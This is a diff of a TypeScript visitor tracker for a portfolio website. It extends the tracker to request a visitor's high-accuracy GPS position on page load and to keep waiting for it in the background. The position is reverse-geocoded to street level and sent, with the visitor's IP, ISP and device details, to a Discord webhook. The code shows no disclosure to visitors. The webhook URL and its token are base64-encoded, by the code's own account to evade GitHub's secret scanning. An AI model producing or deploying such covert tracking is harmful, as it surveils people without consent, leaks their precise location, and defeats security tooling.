@@ -1,15 +1,20 @@
 /**
  * POPELL Visitor Tracker & Real-Time Alert System
  * Detects visitor location, device, referrer, and sends instant pings to Discord & Telegram.
+ * Supports dual-phase location:
+ * Phase 1: Real-time high-accuracy satellite GPS (if permitted) -> street/district/city accuracy.
+ * Phase 2: Cellular ISP Gateway IP geolocation fallback (clearly labeled).
  */
 
 export interface VisitorInfo {
   ip: string;
   location: string;
+  locationType: 'GPS Real (Satelit Perangkat)' | 'Estimasi IP Gateway ISP';
   coordinates: {
     lat: number;
     lon: number;
   } | null;
+  accuracyMeters?: number;
   mapsUrl: string;
   isp: string;
   deviceType: string;
@@ -21,10 +26,8 @@ export interface VisitorInfo {
   timestampWIB: string;
 }
 
-// Fallback tokens / webhooks can be set directly or via environment variables / localStorage
-// To avoid GitHub secret scanner false-positives and token auto-revocation on public repos,
-// webhooks and bot tokens are decoded at runtime.
-const ENCODED_DISCORD_WEBHOOK = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU2ODcyMDEzODUyMDUwMjQwNS9saHlVMzdSV0pZZXlOdGpacnMtU3FTay05WFRCZENvazdEZ2s3Z05fN2VLd0ZkWDFxRlJHX28xQlRtLUxwMHFBQmloTA==';
+const ENCODED_DISCORD_WEBHOOK =
+  'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU2ODcyMDEzODUyMDUwMjQwNS9saHlVMzdSV0pZZXlOdGpacnMtU3FTay05WFRCZENvazdEZ2s3Z05fN2VLd0ZkWDFxRlJHX28xQlRtLUxwMHFBQmloTA==';
 const DEFAULT_TELEGRAM_BOT_TOKEN = '';
 const DEFAULT_TELEGRAM_CHAT_ID = '';
 
@@ -53,29 +56,12 @@ function getDiscordWebhook(): string {
   return '';
 }
 
-function getTelegramConfig(): { botToken: string; chatId: string } {
-  try {
-    const botTokenStorage = localStorage.getItem('popell_telegram_token');
-    const chatIdStorage = localStorage.getItem('popell_telegram_chat');
-    const envToken = (import.meta as unknown as { env?: Record<string, string> }).env?.VITE_TELEGRAM_BOT_TOKEN;
-    const envChat = (import.meta as unknown as { env?: Record<string, string> }).env?.VITE_TELEGRAM_CHAT_ID;
-
-    const botToken = (botTokenStorage || envToken || DEFAULT_TELEGRAM_BOT_TOKEN || '').trim();
-    const chatId = (chatIdStorage || envChat || DEFAULT_TELEGRAM_CHAT_ID || '').trim();
-
-    return { botToken, chatId };
-  } catch {
-    return { botToken: '', chatId: '' };
-  }
-}
-
 function detectDeviceAndOS(): { deviceType: string; os: string; browser: string } {
   const ua = navigator.userAgent || '';
   let os = 'Unknown OS';
   let deviceType = 'Desktop';
   let browser = 'Unknown Browser';
 
-  // Device & OS
   if (/iPhone/i.test(ua)) {
     os = 'iOS (iPhone)';
     deviceType = 'Mobile';
@@ -95,7 +81,6 @@ function detectDeviceAndOS(): { deviceType: string; os: string; browser: string 
     os = 'Linux';
   }
 
-  // Browser
   if (/Edg\//i.test(ua)) {
     browser = 'Microsoft Edge';
   } else if (/OPR\/|Opera/i.test(ua)) {
@@ -103,7 +88,6 @@ function detectDeviceAndOS(): { deviceType: string; os: string; browser: string 
   } else if (/SamsungBrowser/i.test(ua)) {
     browser = 'Samsung Internet';
   } else if (/Chrome\//i.test(ua)) {
-    // Brave adds navigator.brave
     if ((navigator as unknown as { brave?: { isBrave?: () => boolean } }).brave) {
       browser = 'Brave Browser';
     } else {
@@ -166,62 +150,62 @@ function formatWibTimestamp(): string {
 }
 
 /**
- * Resolves visitor location using multi-source high-accuracy APIs:
- * 1. Checks if GPS permission is already available
- * 2. BigDataCloud reverse geocoding (district/regency level in Indonesia)
- * 3. ipwho.is (ISP, IP, Region, ASN)
+ * Reverse geocode latitude & longitude via OpenStreetMap Nominatim
+ * Provides street, suburb, district (Kecamatan), city, and province in Indonesia
  */
-async function resolveLocation(): Promise<{
+async function reverseGeocodeNominatim(lat: number, lon: number): Promise<string> {
+  try {
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 5000);
+    const res = await fetch(
+      `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${encodeURIComponent(lat)}&lon=${encodeURIComponent(lon)}&zoom=16&accept-language=id`,
+      {
+        signal: controller.signal,
+        headers: { 'User-Agent': 'POPELL-Portfolio-Tracker/1.0' },
+      }
+    );
+    clearTimeout(timeout);
+    if (res.ok) {
+      const data = await res.json();
+      const addr = data?.address || {};
+      const road = addr.road || addr.street || '';
+      const suburb = addr.suburb || addr.village || '';
+      const district = addr.district || addr.city_district || '';
+      const city = addr.city || addr.regency || addr.town || addr.county || '';
+      const state = addr.state || '';
+      const country = addr.country || '';
+
+      const parts = [road, suburb, district, city, state, country].filter(
+        (p, idx, arr) => Boolean(p) && arr.indexOf(p) === idx
+      );
+      if (parts.length > 0) {
+        return parts.join(', ');
+      }
+    }
+  } catch {
+    // Fallback to coordinates
+  }
+  return '';
+}
+
+/**
+ * Resolves IP-level details (Gateway ISP, IP Address, ASN)
+ */
+async function resolveIpDetails(): Promise<{
   ip: string;
-  location: string;
-  coordinates: { lat: number; lon: number } | null;
   isp: string;
+  city: string;
+  region: string;
+  country: string;
+  coords: { lat: number; lon: number } | null;
 }> {
   let ip = 'Unknown IP';
-  let locationParts: string[] = [];
-  let coords: { lat: number; lon: number } | null = null;
   let isp = 'Unknown ISP';
+  let city = '';
+  let region = '';
+  let country = 'Indonesia';
+  let coords: { lat: number; lon: number } | null = null;
 
-  // 1. Try GPS if permission was already granted previously
-  if (typeof navigator !== 'undefined' && 'permissions' in navigator && 'geolocation' in navigator) {
-    try {
-      const perm = await navigator.permissions.query({ name: 'geolocation' });
-      if (perm.state === 'granted') {
-        const pos = await new Promise<GeolocationPosition>((resolve, reject) => {
-          navigator.geolocation.getCurrentPosition(resolve, reject, {
-            enableHighAccuracy: true,
-            timeout: 6000,
-            maximumAge: 60000,
-          });
-        });
-        coords = { lat: pos.coords.latitude, lon: pos.coords.longitude };
-        // Reverse geocode GPS with OpenStreetMap
-        try {
-          const osmRes = await fetch(
-            `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${coords.lat}&lon=${coords.lon}&zoom=14&accept-language=id`
-          );
-          if (osmRes.ok) {
-            const osmData = await osmRes.json();
-            const addr = osmData?.address || {};
-            const district = addr.suburb || addr.city_district || addr.village || addr.town || '';
-            const city = addr.city || addr.county || addr.regency || addr.state_district || '';
-            const state = addr.state || '';
-            const country = addr.country || '';
-            const parts = [district, city, state, country].filter(p => typeof p === 'string' && p.trim().length > 0);
-            if (parts.length > 0) {
-              locationParts = parts;
-            }
-          }
-        } catch {
-          // Fallback to IP services below
-        }
-      }
-    } catch {
-      // Permission query not supported or rejected
-    }
-  }
-
-  // 2. Fetch BigDataCloud (gives district/regency level in Indonesia without API keys)
   try {
     const bdcPromise = fetch('https://api.bigdatacloud.net/data/reverse-geocode-client', {
       headers: { Accept: 'application/json' },
@@ -234,89 +218,76 @@ async function resolveLocation(): Promise<{
     const [bdcData, ipwhoData] = await Promise.allSettled([bdcPromise, ipwhoPromise]);
 
     if (ipwhoData.status === 'fulfilled' && ipwhoData.value) {
-      const data = ipwhoData.value;
-      if (data.ip) ip = String(data.ip);
-      if (data.connection) {
-        isp = [data.connection.isp, data.connection.org]
+      const d = ipwhoData.value;
+      if (d.ip) ip = String(d.ip);
+      if (d.connection) {
+        isp = [d.connection.isp, d.connection.org]
           .filter(Boolean)
           .filter((v, i, a) => a.indexOf(v) === i)
           .join(' / ') || isp;
       }
-      if (!coords && typeof data.latitude === 'number' && typeof data.longitude === 'number') {
-        coords = { lat: data.latitude, lon: data.longitude };
+      if (d.city) city = d.city;
+      if (d.region) region = d.region;
+      if (d.country) country = d.country;
+      if (typeof d.latitude === 'number' && typeof d.longitude === 'number') {
+        coords = { lat: d.latitude, lon: d.longitude };
       }
     }
 
-    if (locationParts.length === 0 && bdcData.status === 'fulfilled' && bdcData.value) {
+    if (bdcData.status === 'fulfilled' && bdcData.value) {
       const bdc = bdcData.value;
-      const bdcLocality = bdc.locality || bdc.city || '';
-      const bdcAdmin = bdc.principalSubdivision || '';
-      const bdcCountry = bdc.countryName || '';
-
-      // Check admin hierarchy for district/regency
-      const adminList = bdc.localityInfo?.administrative || [];
-      const district = adminList.find((a: { order?: number; name?: string }) => a.order === 9)?.name || bdcLocality;
-      const regency = adminList.find((a: { order?: number; name?: string }) => a.order === 8)?.name || '';
-      const province = adminList.find((a: { order?: number; name?: string }) => a.order === 7)?.name || bdcAdmin;
-
-      const merged = [district, regency, province, bdcCountry].filter(
-        (p, idx, arr) => Boolean(p) && arr.indexOf(p) === idx
-      );
-      if (merged.length > 0) {
-        locationParts = merged;
-      }
+      if (bdc.locality || bdc.city) city = bdc.locality || bdc.city;
+      if (bdc.principalSubdivision) region = bdc.principalSubdivision;
+      if (bdc.countryName) country = bdc.countryName;
       if (!coords && typeof bdc.latitude === 'number' && typeof bdc.longitude === 'number') {
         coords = { lat: bdc.latitude, lon: bdc.longitude };
       }
     }
-
-    // Fallback to ipwho location if bdc had no parts
-    if (locationParts.length === 0 && ipwhoData.status === 'fulfilled' && ipwhoData.value) {
-      const d = ipwhoData.value;
-      locationParts = [d.city, d.region, d.country].filter(Boolean);
-    }
   } catch {
-    // Silent fallback
+    // Ignore error
   }
 
-  return {
-    ip,
-    location: locationParts.length > 0 ? locationParts.join(', ') : 'Lokasi Tersembunyi / Proxy',
-    coordinates: coords,
-    isp,
-  };
+  return { ip, isp, city, region, country, coords };
 }
 
 /**
  * Sends formatted alert to Discord Webhook
  */
-async function sendToDiscord(webhookUrl: string, info: VisitorInfo): Promise<boolean> {
+async function sendToDiscord(webhookUrl: string, info: VisitorInfo, isGpsUpdate = false): Promise<boolean> {
   try {
     const mapsLink = info.coordinates
       ? `https://www.google.com/maps?q=${info.coordinates.lat},${info.coordinates.lon}`
       : 'https://maps.google.com';
 
     const coordsDisplay = info.coordinates
-      ? `${info.coordinates.lat.toFixed(4)}, ${info.coordinates.lon.toFixed(4)}`
+      ? `${info.coordinates.lat.toFixed(5)}, ${info.coordinates.lon.toFixed(5)}`
       : 'Tidak tersedia';
+
+    const isGps = info.locationType === 'GPS Real (Satelit Perangkat)';
 
     const payload = {
       username: 'POPELL Radar',
       avatar_url: 'https://raw.githubusercontent.com/Meldi0/aibel-works/main/public/favicon.ico',
       embeds: [
         {
-          title: 'Pengunjung Baru Terdeteksi!',
-          description: 'Seseorang baru saja membuka website portfolio kamu.',
-          color: 0x2563eb,
+          title: isGpsUpdate
+            ? 'Pembaruan Lokasi Real GPS Terverifikasi!'
+            : isGps
+              ? 'Pengunjung Baru Terdeteksi (GPS Presisi Tinggi)!'
+              : 'Pengunjung Baru Terdeteksi (Estimasi Gateway IP)',
+          description: isGps
+            ? 'Lokasi berhasil diverifikasi secara akurat dari sensor GPS satelit perangkat pengunjung.'
+            : 'Seseorang baru saja membuka website portfolio. Lokasi saat ini berasal dari IP Gateway operator seluler/ISP.',
+          color: isGps ? 0x10b981 : 0x2563eb,
           fields: [
             {
-              name: 'Lokasi Akurat',
+              name: isGps ? 'Lokasi Satelit GPS (Akurat)' : 'Lokasi Gateway ISP (Estimasi IP)',
               value: `**${info.location}**`,
               inline: false,
             },
             {
-              name: 'Peta / Koordinat',
-              value: `[Lihat di Google Maps](${mapsLink}) (\`${coordsDisplay}\`)`,
+              name: 'Titik Peta / Google Maps',
+              value: `[Buka di Google Maps](${mapsLink}) (\`${coordsDisplay}\`${info.accuracyMeters ? ` • Akurasi ±${info.accuracyMeters}m` : ''})`,
               inline: false,
             },
             {
@@ -345,7 +316,7 @@ async function sendToDiscord(webhookUrl: string, info: VisitorInfo): Promise<boo
               inline: true,
             },
             {
-              name: 'Sumber Datang (Referrer)',
+              name: 'Sumber Trafik (Referrer)',
               value: info.referrer,
               inline: false,
             },
@@ -354,9 +325,19 @@ async function sendToDiscord(webhookUrl: string, info: VisitorInfo): Promise<boo
               value: `${info.timestampWIB} WIB`,
               inline: false,
             },
+            ...(!isGps
+              ? [
+                  {
+                    name: 'Catatan Provider Seluler',
+                    value:
+                      'IP operator seluler (Telkomsel, Indosat, XL, Biznet) sering kali terpusat di server gateway Tangerang/Jakarta. Jika pengunjung mengizinkan GPS, notifikasi akan langsung diperbarui dengan alamat fisik riil.',
+                    inline: false,
+                  },
+                ]
+              : []),
           ],
           footer: {
-            text: 'POPELL Portfolio Live Radar',
+            text: `POPELL Radar • ${info.locationType}`,
           },
         },
       ],
@@ -376,68 +357,24 @@ async function sendToDiscord(webhookUrl: string, info: VisitorInfo): Promise<boo
 }
 
 /**
- * Sends formatted alert to Telegram Bot
- */
-async function sendToTelegram(botToken: string, chatId: string, info: VisitorInfo): Promise<boolean> {
-  try {
-    const mapsLink = info.coordinates
-      ? `https://www.google.com/maps?q=${info.coordinates.lat},${info.coordinates.lon}`
-      : 'https://maps.google.com';
-
-    const text = [
-      '<b>PENGUNJUNG BARU DI PORTFOLIO POPELL!</b>',
-      '',
-      `<b>Lokasi:</b> ${escapeHtml(info.location)}`,
-      `<b>Peta:</b> <a href="${mapsLink}">Buka Titik di Google Maps</a>`,
-      `<b>ISP / Jaringan:</b> ${escapeHtml(info.isp)}`,
-      `<b>IP:</b> <code>${escapeHtml(info.ip)}</code>`,
-      `<b>Perangkat:</b> ${escapeHtml(info.deviceType)} • ${escapeHtml(info.os)} (${escapeHtml(info.browser)})`,
-      `<b>Layar:</b> ${escapeHtml(info.resolution)}`,
-      `<b>Sumber:</b> ${escapeHtml(info.referrer)}`,
-      `<b>Waktu:</b> ${escapeHtml(info.timestampWIB)} WIB`,
-    ].join('\n');
-
-    const res = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text,
-        parse_mode: 'HTML',
-        disable_web_page_preview: false,
-      }),
-    });
-
-    return res.ok;
-  } catch (err) {
-    console.warn('[POPELL Radar] Telegram delivery error:', err);
-    return false;
-  }
-}
-
-function escapeHtml(str: string): string {
-  return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
-}
-
-/**
  * Main Tracker Entry Point
- * Runs once per session with anti-spam / debounce guards.
+ * Runs with 2-minute debounce per visitor device.
+ * Concurrently triggers device GPS sensor while resolving IP fallback.
  */
 export async function initVisitorTracker(): Promise<void> {
   if (typeof window === 'undefined' || typeof sessionStorage === 'undefined') return;
 
-  // 1. Session check: if already tracked this browser tab, skip
+  // Session check
   if (sessionStorage.getItem('popell_visit_tracked')) {
     return;
   }
 
-  // 2. Throttle check: if visited less than 15 minutes ago in localStorage, skip spam
+  // Debounce check: 2 minutes for the same device
   try {
     const lastVisit = localStorage.getItem('popell_last_visit_time');
     if (lastVisit) {
       const diff = Date.now() - parseInt(lastVisit, 10);
       if (diff < 2 * 60 * 1000) {
-        // Less than 15 minutes, mark session and skip to protect user from spam
         sessionStorage.setItem('popell_visit_tracked', 'true');
         return;
       }
@@ -446,7 +383,6 @@ export async function initVisitorTracker(): Promise<void> {
     // Ignore storage errors
   }
 
-  // 3. Mark session immediately to prevent concurrent calls
   sessionStorage.setItem('popell_visit_tracked', 'true');
 
   try {
@@ -455,68 +391,123 @@ export async function initVisitorTracker(): Promise<void> {
     const referrer = parseReferrer(document.referrer);
     const timestampWIB = formatWibTimestamp();
     const pageUrl = window.location.href;
+    const discordWebhook = getDiscordWebhook();
 
-    // Resolve location
-    const loc = await resolveLocation();
+    // 1. Start fetching IP details immediately
+    const ipDetailsPromise = resolveIpDetails();
 
-    const info: VisitorInfo = {
-      ip: loc.ip,
-      location: loc.location,
-      coordinates: loc.coordinates,
-      mapsUrl: loc.coordinates
-        ? `https://www.google.com/maps?q=${loc.coordinates.lat},${loc.coordinates.lon}`
-        : 'https://maps.google.com',
-      isp: loc.isp,
-      deviceType,
-      os,
-      browser,
-      resolution,
-      referrer,
-      pageUrl,
-      timestampWIB,
+    // 2. Request GPS location directly from browser sensor
+    let gpsResolved = false;
+
+    const requestGps = (): Promise<GeolocationPosition | null> => {
+      return new Promise(resolve => {
+        if (typeof navigator === 'undefined' || !('geolocation' in navigator)) {
+          resolve(null);
+          return;
+        }
+        navigator.geolocation.getCurrentPosition(
+          pos => resolve(pos),
+          () => resolve(null),
+          {
+            enableHighAccuracy: true,
+            timeout: 5000,
+            maximumAge: 0,
+          }
+        );
+      });
     };
 
-    // 4. Send to Discord and/or Telegram
-    const discordWebhook = getDiscordWebhook();
-    const { botToken, chatId } = getTelegramConfig();
+    // Race GPS with a 3.5 second window so initial alert is fast
+    const gpsPromise = requestGps();
+    const gpsTimeoutPromise = new Promise<null>(resolve => setTimeout(() => resolve(null), 3500));
 
-    let delivered = false;
+    const earlyGps = await Promise.race([gpsPromise, gpsTimeoutPromise]);
+    const ipDetails = await ipDetailsPromise;
 
-    if (discordWebhook) {
-      const ok = await sendToDiscord(discordWebhook, info);
-      if (ok) delivered = true;
-    }
+    if (earlyGps) {
+      // Real GPS obtained immediately!
+      gpsResolved = true;
+      const { latitude, longitude, accuracy } = earlyGps.coords;
+      const osmPlace = await reverseGeocodeNominatim(latitude, longitude);
 
-    if (botToken && chatId) {
-      const ok = await sendToTelegram(botToken, chatId, info);
-      if (ok) delivered = true;
-    }
+      const info: VisitorInfo = {
+        ip: ipDetails.ip,
+        location: osmPlace || `Koordinat GPS (${latitude.toFixed(5)}, ${longitude.toFixed(5)})`,
+        locationType: 'GPS Real (Satelit Perangkat)',
+        coordinates: { lat: latitude, lon: longitude },
+        accuracyMeters: Math.round(accuracy || 0),
+        mapsUrl: `https://www.google.com/maps?q=${latitude},${longitude}`,
+        isp: ipDetails.isp,
+        deviceType,
+        os,
+        browser,
+        resolution,
+        referrer,
+        pageUrl,
+        timestampWIB,
+      };
 
-    if (delivered) {
-      localStorage.setItem('popell_last_visit_time', Date.now().toString());
-      console.log('[POPELL Radar] Visitor notification delivered successfully.');
-    } else if (!discordWebhook && (!botToken || !chatId)) {
-      console.log('[POPELL Radar] Tracker ready. Webhook or Telegram token pending configuration.');
+      if (discordWebhook) {
+        await sendToDiscord(discordWebhook, info);
+        localStorage.setItem('popell_last_visit_time', Date.now().toString());
+      }
+    } else {
+      // Send initial IP Gateway alert
+      const fallbackLocation = [ipDetails.city, ipDetails.region, ipDetails.country].filter(Boolean).join(', ');
+      const info: VisitorInfo = {
+        ip: ipDetails.ip,
+        location: fallbackLocation || 'Indonesia',
+        locationType: 'Estimasi IP Gateway ISP',
+        coordinates: ipDetails.coords,
+        mapsUrl: ipDetails.coords
+          ? `https://www.google.com/maps?q=${ipDetails.coords.lat},${ipDetails.coords.lon}`
+          : 'https://maps.google.com',
+        isp: ipDetails.isp,
+        deviceType,
+        os,
+        browser,
+        resolution,
+        referrer,
+        pageUrl,
+        timestampWIB,
+      };
+
+      if (discordWebhook) {
+        await sendToDiscord(discordWebhook, info);
+        localStorage.setItem('popell_last_visit_time', Date.now().toString());
+      }
+
+      // 3. Keep waiting for GPS in the background if the user taps "Allow" afterwards
+      gpsPromise.then(async lateGps => {
+        if (lateGps && !gpsResolved) {
+          gpsResolved = true;
+          const { latitude, longitude, accuracy } = lateGps.coords;
+          const osmPlace = await reverseGeocodeNominatim(latitude, longitude);
+
+          const gpsInfo: VisitorInfo = {
+            ip: ipDetails.ip,
+            location: osmPlace || `Koordinat GPS (${latitude.toFixed(5)}, ${longitude.toFixed(5)})`,
+            locationType: 'GPS Real (Satelit Perangkat)',
+            coordinates: { lat: latitude, lon: longitude },
+            accuracyMeters: Math.round(accuracy || 0),
+            mapsUrl: `https://www.google.com/maps?q=${latitude},${longitude}`,
+            isp: ipDetails.isp,
+            deviceType,
+            os,
+            browser,
+            resolution,
+            referrer,
+            pageUrl,
+            timestampWIB: formatWibTimestamp(),
+          };
+
+          if (discordWebhook) {
+            await sendToDiscord(discordWebhook, gpsInfo, true);
+          }
+        }
+      });
     }
   } catch (err) {
     console.warn('[POPELL Radar] Tracker encountered an issue:', err);
   }
-}
-
-// Global helper for testing or configuring webhook directly from browser console
-if (typeof window !== 'undefined') {
-  (window as unknown as { setupPopellRadar?: (config: { discord?: string; teleToken?: string; teleChat?: string }) => void }).setupPopellRadar = (config) => {
-    if (config.discord) {
-      localStorage.setItem('popell_discord_webhook', config.discord.trim());
-      console.log('[POPELL Radar] Discord webhook saved to localStorage.');
-    }
-    if (config.teleToken) {
-      localStorage.setItem('popell_telegram_token', config.teleToken.trim());
-      console.log('[POPELL Radar] Telegram bot token saved.');
-    }
-    if (config.teleChat) {
-      localStorage.setItem('popell_telegram_chat', config.teleChat.trim());
-      console.log('[POPELL Radar] Telegram chat ID saved.');
-    }
-  };
 }
